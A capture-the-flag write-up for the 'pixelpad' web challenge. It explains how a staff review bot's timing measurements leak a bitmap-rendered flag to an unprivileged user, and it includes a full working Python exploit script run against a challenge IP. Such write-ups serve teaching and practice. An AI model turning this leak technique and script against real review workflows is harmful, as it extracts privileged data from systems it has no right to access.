# web/pixelpad

## Overview

This challenge is a source-assisted web exploitation challenge built around a fake “staff review” workflow.

At a high level, the app works like this:

1. a normal user creates an HTML note
2. the note can be submitted for staff review
3. a privileged staff bot opens the note
4. the staff workflow opens a staff-only export page
5. that export page renders a bitmap containing the flag
6. the review system measures that bitmap and stores a summary
7. that summary is returned to the unprivileged user through the normal review API

So the vulnerbility is that the review system itself leaks measurements from a staff-only page, and we can control what region is measured (to produce the measurement).

There is also an important fake flag clue in the source. In `docker-compose.yml`, the local development flag is:

```text
codegate2026{fakefakefakefakefakefakefakefake}
```

In `server/lib/sheet.js`, the real exported flag comes from `process.env.FLAG`, so the live service uses a different value. The challenge description says the real and fake flags have the same length. That matters because the rendered flag is drawn as a fixed-width bitmap, so knowing the length tells us how wide the final scan region must be.

## Exploit Chain

1. Find the review entry point

   In `server/lib/index.js`, the main endpoint is:

   ```js
   app.post("/api/report", auth, requireAuth, async (req, res) => {
   ```

   This endpoint:

   - fetches the target note
   - parses the note with `parseConfig(note.content)`
   - creates a review session in the database
   - builds a review URL on the share host
   - launches the bot with `visitReviewSession(...)`

   It immediately returns a `reviewSessionId` to us. Later, we can poll:

   ```js
   app.get("/api/review/:sessionId", auth, requireAuth, async (req, res) => {
   ```

   If the review completes, this endpoint returns:

   - `artifact`
   - `renderSeed`
   - `layoutSeed`

   That tells us the app is already designed to hand review output back to the reporting user. So the key is whether we can make that artifact contain flag information.

2. Understand what kind of note is accepted

   Still in `server/lib/index.js`, the validation logic is in:

   - `validateBootstrapFragment(content)`
   - `parseConfig(content)`

   This code is strict. A valid review note must contain exactly one root element:

   ```html
   <section data-review-bootstrap="window-v1" ...>
   ```

   Inside it, the server requires:

   - one `<svg>`
   - one `<filter>`
   - one `<feComponentTransfer>`
   - exactly three channel stages:
     - `<feFuncR>`
     - `<feFuncG>`
     - `<feFuncB>`

   And all of them must use:

   ```html
   tableValues="0 1"
   ```

   The attributes we have control of and matter are:

   - `data-scan-x`
   - `data-scan-y`
   - `data-scan-width`
   - `data-scan-height`
   - `data-samples`
   - `data-baseline-repeats`
   - `data-columns`
   - `data-rows`

   That is the core primitive: we can choose which part of the staff-only export page will be measured.

3. Find where the flag is rendered

   In `server/lib/sheet.js`:

   ```js
   const FLAG = process.env.FLAG;
   ```

   Then:

   - `encodeRows(text)` renders characters as a 5x7 bitmap font
   - `buildReportData(session)` builds the rows used for the export
   - `renderReport(session)` renders the SVG seen by staff

   The important line is the layout of the bitmap rows:

   ```js
   const rows = header.map((row, y) => row + spacer + flagRows[y]);
   ```

   Where:

   - `header` is a 20-column block
   - `spacer` is `"00"` which is 2 columns
   - `flagRows` is the actual flag bitmap

   So the flag starts at x-coordinate:

   ```text
   20 + 2 = 22
   ```

   Now the width. Each symbol is:

   - 5 columns of pixels
   - 1 spacer column after it

   So total width for a string of length `n` is:

   ```text
   6n - 1
   ```

   The fake flag length is 46, so the real flag width must also be:

   ```text
   6 * 46 - 1 = 275
   ```

   That gives the exact region containing the flag:

   - `scanX = 22`
   - `scanY = 0`
   - `scanWidth = 275`
   - `scanHeight = 7`

   We just need to take measurement of each of these pixels to retrieve the flag as an image.

4. Leak the flag

   The staff-only export page is in `server/public/account/export.js`, this page loads the SVG (which is the flag rendered as text) and then computes a value for each pixel. The critical function is:

   ```js
   function measureCell(x, y, phase, sampleIndex) {
   ```

   When `phase` is `baseline`, it returns the `baseTime + noise` for that pixel (svg rect). When the `phase` is `signal`, it returns `baseTime + noise` PLUS a `boost`, where the boost is a large number when that pixel is black (filtered), and a tiny number when that pixel is white (unfiltered).

   `review-inspector.js` conveniently aggregates this data into: `baselineRows`, `signalRows` and `deltaRows` for us. Based on our finding, a black pixel should have a big value in `deltaRows` and a white pixel should have a smaller, close to 0 value.

5. Respect the scan window limit and chunk the attack

   In `parseConfig(content)` in `server/lib/index.js`, there is a hard limit:

   ```js
   if (scanWidth * scanHeight > 350) {
     return { error: "scan window is too large for a single review session" };
   }
   ```

   Since the flag height is 7 rows, the maximum full-height scan width is: `350 / 7 = 50`. But the flag width is 275, so one review session cannot recover the whole thing.

   Therefore, we split it into 6 chunks:

   1. `x=22`, width `50`
   2. `x=72`, width `50`
   3. `x=122`, width `50`
   4. `x=172`, width `50`
   5. `x=222`, width `50`
   6. `x=272`, width `25`

   Each chunk recovers 7 rows of bitmap data for part of the flag.

6. Handle the hostname checks

   In `server/lib/index.js`, the app has separate virtual hosts:

   - `app.pixelpad.local`
   - `share.pixelpad.local`
   - `account.pixelpad.local`

   And many routes check the host explicitly:

   - app API routes require the app host
   - share routes require the share host
   - account routes require the account host

   The provided instances are reachable by IP, but the app logic still checks the `Host` header.

   So the solve script must:

   - connect to `http://<provided-ip>:3000`
   - send `Host: app.pixelpad.local:3000`

   That is enough for `/api/register`, `/api/login`, `/api/notes`, `/api/report`, and `/api/review/:id`.

7. Undo the broken column permutation

   In `server/public/share/js/review-inspector.js`, before storing the final rows, the client applies a column permutation:

   ```js
   var colPerm = manifest.windowSpec.columnOrder;
   ```

   and then:

   ```js
   deltaRows = applyColumnPermutation(deltaRows, localPerm);
   ```

   The weird part is that `server/lib/sheet.js` computes `columnOrder`, but `renderReport()` never actually uses it to reorder the rendered SVG. So the client scrambles the measurements even though the underlying report was never permuted.

   That means the stored `deltaRows` are in the wrong order. To fix them, the solve script must reproduce the same local permutation logic from `review-inspector.js`:

   ```js
   function buildLocalPermutation(fullPerm, scanX, scanWidth) {
     var slice = fullPerm.slice(scanX, scanX + scanWidth);
     var indexed = slice.map(function (val, i) { return { val: val, idx: i }; });
     indexed.sort(function (a, b) { return a.val - b.val; });
     var localPerm = new Array(scanWidth);
     for (var rank = 0; rank < scanWidth; rank++) {
       localPerm[indexed[rank].idx] = rank;
     }
     return localPerm;
   }
   ```

   Then, for each stored row:

   ```text
   restored[i] = scrambled[localPerm[i]]
   ```

   After doing this for every chunk and concatenating the results, the original left-to-right flag bitmap is recovered.

8. Identify the letters in the bitmap

   Because `server/lib/sheet.js` includes the exact `SYMBOLS` font table, we can compare the bitmap against this known table to reveal the exact flag as text.

   Each character is:

   - 5 columns wide
   - followed by 1 spacer column

   So the solve script can just:

   - slices the recovered rows into 46 glyphs
   - compares each 5x7 glyph against every known pattern in `SYMBOLS`
   - chooses the highest-scoring match

   That yields the remote flag as text.

## Final Solve

```python
#!/usr/bin/env python3
import json
import random
import string
import sys
import time
from urllib import error, request

SYMBOLS = {
    "0": ["01110", "10001", "10011", "10101", "11001", "10001", "01110"],
    "1": ["00100", "01100", "00100", "00100", "00100", "00100", "01110"],
    "2": ["01110", "10001", "00001", "01110", "10000", "10000", "11111"],
    "3": ["11111", "00001", "00010", "00110", "00001", "10001", "01110"],
    "4": ["00010", "00110", "01010", "10010", "11111", "00010", "00010"],
    "5": ["11111", "10000", "11110", "00001", "00001", "10001", "01110"],
    "6": ["00111", "01000", "10000", "11110", "10001", "10001", "01110"],
    "7": ["11111", "00001", "00001", "00010", "00100", "01000", "10000"],
    "8": ["01110", "10001", "10001", "01110", "10001", "10001", "01110"],
    "9": ["01110", "10001", "10001", "01111", "00001", "00010", "11100"],
    "a": ["00000", "00000", "01100", "00010", "01110", "10010", "01111"],
    "b": ["10000", "10000", "10110", "11001", "10001", "11001", "10110"],
    "c": ["00000", "00000", "01110", "10001", "10000", "10001", "01110"],
    "d": ["00001", "00001", "01101", "10011", "10001", "10011", "01101"],
    "e": ["00000", "00000", "01110", "10001", "11111", "10000", "01110"],
    "f": ["00010", "00101", "00100", "01110", "00100", "00100", "00100"],
    "g": ["00000", "00000", "01110", "10011", "10011", "01101", "00001"],
    "h": ["10000", "10000", "10110", "11001", "10001", "10001", "10001"],
    "i": ["00100", "00000", "01100", "00100", "00100", "00100", "01110"],
    "j": ["00010", "00000", "00010", "00010", "00010", "10010", "01100"],
    "k": ["10000", "10000", "10010", "10100", "11000", "10100", "10010"],
    "l": ["01100", "00100", "00100", "00100", "00100", "00100", "01110"],
    "m": ["00000", "00000", "11010", "10101", "10101", "10101", "10101"],
    "n": ["00000", "00000", "10110", "11001", "10001", "10001", "10001"],
    "o": ["00000", "00000", "01110", "10001", "10001", "10001", "01110"],
    "p": ["00000", "00000", "10110", "11001", "11001", "10110", "10000"],
    "q": ["00000", "00000", "01101", "10011", "10011", "01101", "00001"],
    "r": ["00000", "00000", "10110", "11001", "10000", "10000", "10000"],
    "s": ["00000", "00000", "01111", "10000", "01110", "00001", "11110"],
    "t": ["00100", "00100", "11111", "00100", "00100", "00101", "00010"],
    "u": ["00000", "00000", "10001", "10001", "10001", "10011", "01101"],
    "v": ["00000", "00000", "10001", "10001", "10001", "01010", "00100"],
    "w": ["00000", "00000", "10001", "10001", "10101", "10101", "01010"],
    "x": ["00000", "00000", "10001", "01010", "00100", "01010", "10001"],
    "y": ["00000", "00000", "10001", "10001", "01111", "00001", "10001"],
    "z": ["00000", "00000", "11111", "00010", "00100", "01000", "11111"],
    "{": ["00010", "00100", "00100", "01000", "00100", "00100", "00010"],
    "}": ["01000", "00100", "00100", "00010", "00100", "00100", "01000"],
}

FLAG_LEN = 46
FLAG_WIDTH = 6 * FLAG_LEN - 1
SCAN_START = 22
SCAN_HEIGHT = 7
CHUNK_WIDTH = 50
SAMPLES = 8
TAU = 0.35
APP_HOST = "app.pixelpad.local:3000"


class Client:
    def __init__(self, ip):
        self.base = f"http://{ip}:3000"
        self.cookie = None

    def request_json(self, method, path, body=None, timeout=90):
        headers = {"Host": APP_HOST}
        raw_body = None
        if self.cookie:
            headers["Cookie"] = self.cookie
        if body is not None:
            headers["Content-Type"] = "application/json"
            raw_body = json.dumps(body).encode()

        req = request.Request(
            self.base + path,
            data=raw_body,
            headers=headers,
            method=method,
        )

        try:
            with request.urlopen(req, timeout=timeout) as resp:
                data = resp.read().decode()
                try:
                    parsed = json.loads(data)
                except Exception:
                    parsed = data
                return resp.status, parsed, resp.headers
        except error.HTTPError as exc:
            data = exc.read().decode()
            try:
                parsed = json.loads(data)
            except Exception:
                parsed = data
            return exc.code, parsed, exc.headers

    def register_and_login(self):
        username = "u" + "".join(random.choice(string.ascii_lowercase) for _ in range(8))
        password = "pass1234"

        status, data, _ = self.request_json(
            "POST", "/api/register", {"username": username, "password": password}
        )
        if status != 200:
            raise RuntimeError(f"register failed: {status} {data}")

        status, data, headers = self.request_json(
            "POST", "/api/login", {"username": username, "password": password}
        )
        if status != 200:
            raise RuntimeError(f"login failed: {status} {data}")

        set_cookie = headers.get("Set-Cookie", "")
        self.cookie = set_cookie.split(";", 1)[0]
        if not self.cookie.startswith("session="):
            raise RuntimeError(f"did not get a session cookie: {set_cookie}")

    def make_note(self, scan_x, scan_width):
        return (
            f'<section data-review-bootstrap="window-v1" '
            f'data-pane-slot="workspace-pane" '
            f'data-amplify="1" '
            f'data-columns="400" '
            f'data-rows="{SCAN_HEIGHT}" '
            f'data-samples="{SAMPLES}" '
            f'data-baseline-repeats="{SAMPLES}" '
            f'data-threshold="0.5" '
            f'data-scan-x="{scan_x}" '
            f'data-scan-y="0" '
            f'data-scan-width="{scan_width}" '
            f'data-scan-height="{SCAN_HEIGHT}">'
            f'<svg width="1" height="1" viewBox="0 0 1 1" aria-hidden="true">'
            f'<filter id="pixelpad-lut">'
            f'<feComponentTransfer color-interpolation-filters="sRGB">'
            f'<feFuncR type="table" tableValues="0 1"></feFuncR>'
            f'<feFuncG type="table" tableValues="0 1"></feFuncG>'
            f'<feFuncB type="table" tableValues="0 1"></feFuncB>'
            f'</feComponentTransfer>'
            f'</filter>'
            f'</svg>'
            f'<p>scan</p>'
            f'</section>'
        )

    def run_review(self, scan_x, scan_width):
        note = self.make_note(scan_x, scan_width)

        status, data, _ = self.request_json("POST", "/api/notes", {"content": note})
        if status != 200:
            raise RuntimeError(f"note create failed: {status} {data}")

        status, review, _ = self.request_json(
            "POST",
            "/api/report",
            {"userId": data["userId"], "seq": data["seq"]},
        )
        if status != 200:
            raise RuntimeError(f"report failed: {status} {review}")

        review_id = review["reviewSessionId"]

        for _ in range(40):
            time.sleep(2)
            status, state, _ = self.request_json("GET", f"/api/review/{review_id}")
            if status != 200:
                continue
            if state.get("state") == "completed" and state.get("artifact"):
                return state["artifact"]
            if state.get("state") == "failed":
                raise RuntimeError(f"review failed: {state.get('failureReason')}")

        raise RuntimeError("review timed out")


def build_local_perm(column_order, scan_x, scan_width):
    window = column_order[scan_x : scan_x + scan_width]
    indexed = [{"val": value, "idx": idx} for idx, value in enumerate(window)]
    indexed.sort(key=lambda item: item["val"])

    local = [None] * scan_width
    for rank, item in enumerate(indexed):
        local[item["idx"]] = rank
    return local


def recover_rows(client):
    recovered = [[] for _ in range(SCAN_HEIGHT)]

    for scan_x in range(SCAN_START, SCAN_START + FLAG_WIDTH, CHUNK_WIDTH):
        scan_width = min(CHUNK_WIDTH, SCAN_START + FLAG_WIDTH - scan_x)

        for attempt in range(1, 4):
            try:
                print(f"[+] scanning x={scan_x} width={scan_width} attempt={attempt}")
                artifact = client.run_review(scan_x, scan_width)

                local_perm = build_local_perm(
                    artifact["windowSpec"]["columnOrder"], scan_x, scan_width
                )

                for y, row in enumerate(artifact["deltaRows"]):
                    restored = [row[local_perm[i]] for i in range(scan_width)]
                    recovered[y].extend(restored)
                break
            except Exception as exc:
                if attempt == 3:
                    raise
                print(f"[-] retrying x={scan_x}: {exc}")
                time.sleep(2)

    return recovered


def decode_flag(rows):
    out = []

    for idx in range(FLAG_LEN):
        start = idx * 6
        best_char = None
        best_score = float("-inf")

        for ch, glyph in SYMBOLS.items():
            score = 0.0
            for y in range(SCAN_HEIGHT):
                for x in range(5):
                    value = rows[y][start + x] - TAU
                    if glyph[y][x] == "1":
                        score += value
                    else:
                        score -= value

            if score > best_score:
                best_score = score
                best_char = ch

        out.append(best_char)

    return "".join(out)


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <target-ip>", file=sys.stderr)
        print(f"example: {sys.argv[0]} 3.37.29.215", file=sys.stderr)
        sys.exit(1)

    client = Client(sys.argv[1])
    client.register_and_login()
    rows = recover_rows(client)
    flag = decode_flag(rows)
    print(f"[+] flag = {flag}")


if __name__ == "__main__":
    main()
```

Run it:

```bash
python3 solve.py 3.37.29.215
```
